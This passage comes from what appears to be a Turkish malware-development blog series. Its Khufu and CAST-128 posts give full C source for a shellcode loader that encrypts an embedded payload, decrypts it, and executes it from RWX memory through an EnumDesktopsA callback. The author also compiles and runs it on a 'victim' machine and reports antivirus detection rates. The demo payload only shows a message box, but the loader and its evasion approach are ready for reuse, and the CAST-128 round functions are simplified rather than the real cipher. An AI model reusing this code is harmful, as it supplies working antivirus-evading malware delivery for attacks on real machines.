uint32_t right = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
((uint32_t)block[6] << 8) | (uint32_t)block[7];

left ^= ((uint32_t)key[8] << 24) | ((uint32_t)key[9] << 16) | ((uint32_t)key
[10] << 8) | (uint32_t)key[11];
right ^= ((uint32_t)key[12] << 24) | ((uint32_t)key[13] << 16) | ((uint32_t)
key[14] << 8) | (uint32_t)key[15];

for (int round = ROUNDS - 1; round >= 0; round--) {
uint32_t temp = right;
right = left ^ sbox[right & 0xFF];
left = (temp << 8) | (temp >> 24);
uint32_t temp2 = left;
left = right;
right = temp2;
}

left ^= ((uint32_t)key[0] << 24) | ((uint32_t)key[1] << 16) | ((uint32_t)key
[2] << 8) | (uint32_t)key[3];
right ^= ((uint32_t)key[4] << 24) | ((uint32_t)key[5] << 16) | ((uint32_t)key
[6] << 8) | (uint32_t)key[7];

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}
Ana mantık, kabuk kodu şifreleme ve şifre çözme fonksiyonlarıdır:
void khufu_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
khufu_encrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
khufu_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

void khufu_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	khufu_decrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
khufu_decrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}
Görüldüğü gibi, kabuk kodu blok blok şifrelenir ve çözülür. Kabuk kodunun uzunluğu blok boyutunun katı değilse, şifreleme öncesinde (0x90) ile doldurulur ve şifre çözme sırasında uygun şekilde işlenir.
Son olarak, payload’u çalıştırmamız gerekiyor:
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (8 - my_payload_len % 8) % 8;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len);
memcpy(padded, my_payload, my_payload_len);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

khufu_encrypt_shellcode(padded, pad_len);

printf("encrypted shellcode: ");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

khufu_decrypt_shellcode(padded, pad_len);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}

printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}

Her zamanki gibi, meow-meow mesaj kutusu payload’u kullandım:
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";
ve bunu EnumDesktopsA işlevine geri çağırma fonksiyonu olarak ileterek çalıştırdım.
Tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* encrypt/decrypt payload
* via Khufu algorith
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/21/malware-cryptography-30.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 16
#define BLOCK_SIZE 8
#define KEY_SIZE 64

uint8_t key[KEY_SIZE] = {
0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F
};

uint32_t sbox[256];

void khufu_generate_sbox(uint8_t *key, int round) {
for (int i = 0; i < 256; i++) {
sbox[i] = (key[(round * 8 + i) % KEY_SIZE] << 24) |
(key[(round * 8 + i + 1) % KEY_SIZE] << 16) |
(key[(round * 8 + i + 2) % KEY_SIZE] << 8) |
key[(round * 8 + i + 3) % KEY_SIZE];
}
}

void khufu_encrypt(uint8_t *block, uint8_t *key) {
uint32_t left = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
((uint32_t)block[2] << 8) | (uint32_t)block[3];
uint32_t right = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
((uint32_t)block[6] << 8) | (uint32_t)block[7];

left ^= ((uint32_t)key[0] << 24) | ((uint32_t)key[1] << 16) |
((uint32_t)key[2] << 8) | (uint32_t)key[3];
right ^= ((uint32_t)key[4] << 24) | ((uint32_t)key[5] << 16) |
((uint32_t)key[6] << 8) | (uint32_t)key[7];

for (int round = 0; round < ROUNDS; round++) {
khufu_generate_sbox(key, round);
uint32_t temp = left;
left = right ^ sbox[left & 0xFF];
right = (temp >> 8) | (temp << 24);
uint32_t temp2 = left;
left = right;
right = temp2;
}

left ^= ((uint32_t)key[8] << 24) | ((uint32_t)key[9] << 16) |
((uint32_t)key[10] << 8) | (uint32_t)key[11];
right ^= ((uint32_t)key[12] << 24) | ((uint32_t)key[13] << 16) |
((uint32_t)key[14] << 8) | (uint32_t)key[15];

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}

void khufu_decrypt(uint8_t *block, uint8_t *key) {
uint32_t left = ((uint32_t)block[0] << 24) | ((uint32_t)block[1] << 16) |
((uint32_t)block[2] << 8) | (uint32_t)block[3];
uint32_t right = ((uint32_t)block[4] << 24) | ((uint32_t)block[5] << 16) |
((uint32_t)block[6] << 8) | (uint32_t)block[7];
left ^= ((uint32_t)key[8] << 24) | ((uint32_t)key[9] << 16) | ((uint32_t)key
[10] << 8) | (uint32_t)key[11];
right ^= ((uint32_t)key[12] << 24) | ((uint32_t)key[13] << 16) | ((uint32_t)
key[14] << 8) | (uint32_t)key[15];

for (int round = ROUNDS - 1; round >= 0; round--) {
uint32_t temp = right;
right = left ^ sbox[right & 0xFF];
left = (temp << 8) | (temp >> 24);
uint32_t temp2 = left;
left = right;
right = temp2;
}

left ^= ((uint32_t)key[0] << 24) | ((uint32_t)key[1] << 16) |
((uint32_t)key[2] << 8) | (uint32_t)key[3];
right ^= ((uint32_t)key[4] << 24) | ((uint32_t)key[5] << 16) |
((uint32_t)key[6] << 8) | (uint32_t)key[7];

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}

void khufu_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	khufu_encrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
khufu_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

void khufu_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	khufu_decrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
khufu_decrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}

int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (8 - my_payload_len % 8) % 8;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len);
memcpy(padded, my_payload, my_payload_len);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

khufu_encrypt_shellcode(padded, pad_len);

printf("encrypted shellcode: ");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

khufu_decrypt_shellcode(padded, pad_len);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)
NULL);
return 0;
}
Bu örnek, Khufu şifreleme algoritmasını kullanarak payload’u şifreleme ve şifre çözme işlemlerinin nasıl yapılacağını göstermektedir. Doğruluk kontrolü için karşılaştırma ve yazdırma mantığı eklenmiştir.
Demo

Her şeyi çalışırken görelim. Derleyelim (Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++

Ardından, sadece mağdurun makinesinde (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Görüldüğü gibi, her şey mükemmel çalıştı! =..=
Shannon entropisini hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Payload’umuz .text bölümünde.
Hadi hack.exe dosyasını VirusTotal’a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/3a83cabfaa701d9b23b4b78c4c81084ada736afd
b20e0a67581c9208c1a0249a/detection
Gördüğünüz gibi, sadece 45 AV motorundan 15’i dosyamızı kötü amaçlı olarak algılıyor.
Ancak bu sonuç, payload’un şifrelenmesinden değil, VirtualAlloc, RtlMoveMemory ve EnumDesktopsA gibi bazı Windows API çağrılarından kaynaklanmaktadır.
Bazı AV istatistiklerinin zaman aşımına uğradığını unutmayın:
+++++++++++++++++++++++++++++++++++++++++++++++
Khufu algoritmasının diferansiyel kriptoanalize karşı dayanıklılığı, anahtara bağlı ve gizli S-kutularının kullanımı nedeniyle oluşmaktadır. 16 turlu Khufu şifrelemesine karşı diferansiyel bir saldırı keşfedilmiş olup, 2^31 seçilmiş düz metinle şifreleme anahtarının kurtarılmasına olanak tanımaktadır (H. Gilbert ve P. Chauvaud, “A Chosen Plaintext Attack of the 16-Round Khufu Cryptosystem,” Advances in Cryptology - CRYPTO ’94 Proceedings, Springer-Verlag, 1994).Ancak bu saldırı, daha fazla tur sayısına sahip bir şifreleme için geçerli değildir.
Bu gönderinin, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olmasını, mavi takım üyelerinin bu ilginç şifreleme tekniği hakkında farkındalık kazanmasını sağlamasını ve kırmızı takımın cephaneliğine bir silah eklemesini umuyorum.
Khufu and Khafre
H. Gilbert and P. Chauvaud - A Chosen Plaintext Attack of the 16-round Khufu Cryp-
tosystem
Malware and cryptography 1
Github’taki kaynak kod


94. kötü amaçlı yazılım ve kriptografi araştırması - bölüm 3 (31): CAST-128 payload şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, kötü amaçlı yazılım geliştirmede CAST-128 blok şifreleyicisinin kullanımına dair kendi araştırmamın sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, payload’u şifrelemek/şifresini çözmek için bunu uygularsak ne olacağını kontrol etmeye karar verdim.
CAST-128

CAST-128 şifreleme yöntemi, DES'e benzeyen ve bir substitüsyon-permutasyon ağı (SPN) kullanan bir kriptografik sistemdir. Diferansiyel kriptanaliz, doğrusal kriptanaliz ve ilişkili anahtar kriptanalizine karşı güçlü bir direnç gösterdiği kanıtlanmıştır.
CAST-128, 12 veya 16 turdan oluşan bir Feistel şifresidir. 64 bitlik bloklar üzerinde çalışır ve 128 bit uzunluğa kadar anahtarları destekler. Şifre, doğrusal ve diferansiyel saldırılara karşı korunmak için döndürme işlemleri içerir. CAST-128’in tur fonksiyonu, XOR, toplama ve çıkarma (mod 2**32) işlemlerinin bir kombinasyonunu kullanır. Ayrıca, şifreleme işlemi boyunca üç farklı tur fonksiyon varyasyonu kullanır.
pratik örnek

Öncelikle, 128 bitlik bir anahtara ihtiyacımız var:
uint32_t key[4] = {0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210};
128 bitlik bir anahtar (key[4]), dört 32 bitlik tamsayı ile başlatılır. Bu anahtar, CAST-128 şifreleme ve şifre çözme işlemlerinde kullanılacaktır.
Daha sonra CAST-128 tur fonksiyonlarına ihtiyacımız var:
void f1(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib) & 0xFFFF); // ensure no overflow
*d = (*d + f) & 0xFFFFFFFF;
}

void f2(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib + 1) & 0xFFFF); // avoid division by zero
*d = (*d ^ f) & 0xFFFFFFFF;
}

void f3(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia - Ib) & 0xFFFF); // ensure no overflow
*d = (*d ^ f) & 0xFFFFFFFF;
}
f1, f2 ve f3 fonksiyonları: benim durumumda bunlar, CAST-128'de kullanılan tur fonksiyonlarının basitleştirilmiş versiyonlarıdır. Her fonksiyon, bir 32 bitlik kelimeye (d) işaretçi ve 32 bitlik bir alt anahtar (k) alır. Fonksiyonlar, d'nin değerini değiştirmek için bit düzeyinde ve aritmetik işlemler uygular.
Bir sonraki adım, cast_key_schedule fonksiyonudur; bu fonksiyon, şifreleme veya şifre çözme işleminin her turu için alt anahtarları hazırlar. Ana anahtara dayalı olarak bir alt anahtar dizisini (subkeys[ROUNDS][4]) başlatır:
void cast_key_schedule(uint32_t* key, uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < ROUNDS; i++) {
subkeys[i][0] = key[0];
subkeys[i][1] = key[1];
subkeys[i][2] = key[2];
subkeys[i][3] = key[3];
}
}
Bir sonraki adım, CAST-128 şifreleme mantığıdır:
void cast_encrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];
for (int i = 0; i < ROUNDS; i++) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}

block[0] = right;
block[1] = left;
}
Mantık basittir, cast_encrypt fonksiyonu, CAST-128 algoritmasını kullanarak bir veri bloğunu şifreler. 32 bitlik kelime çiftleri (sol ve sağ) üzerinde çalışır. Her turda, tur fonksiyonlarından biri (f1, f2 veya f3) uygulanır ve sonuçlar bloğu değiştirmek için kullanılır.
Daha sonra, cast_decrypt fonksiyonu bir veri bloğunun şifresini çözer. cast_encrypt fonksiyonuna benzer şekilde çalışır ancak turları ters sırayla işler:
void cast_decrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];

for (int i = ROUNDS - 1; i >= 0; i--) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}

block[0] = right;
block[1] = left;
}
Ana mantık, shellcode şifreleme ve şifre çözme fonksiyonlarını içermektedir:
void cast_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_encrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}
void cast_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_decrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}
Gördüğünüz gibi, shellcode'u blok blok (her seferinde 8 bayt) işlerler. Shellcode uzunluğu blok boyutunun katı değilse, şifreleme öncesinde dolgu (0x90) eklenir ve ardından şifre çözme işlemi buna göre gerçekleştirilir.
Son olarak, payload’u çalıştırmamız gerekir:
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
unsigned char padded[my_payload_len];
memcpy(padded, my_payload, my_payload_len);

uint32_t subkeys[ROUNDS][4];
cast_key_schedule(key, subkeys);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

cast_encrypt_shellcode(padded, my_payload_len, subkeys);

printf("encrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

cast_decrypt_shellcode(padded, my_payload_len, subkeys);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)
NULL);
return 0;
}
Ana fonksiyonda, bir payload(shellcode) tanımlanır ve anahtar planlaması oluşturulur. Shellcode, CAST-128 algoritması kullanılarak şifrelenir ve ardından şifresi çözülür.
Her zamanki gibi, meow-meow messagebox payload’u kullandım:
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
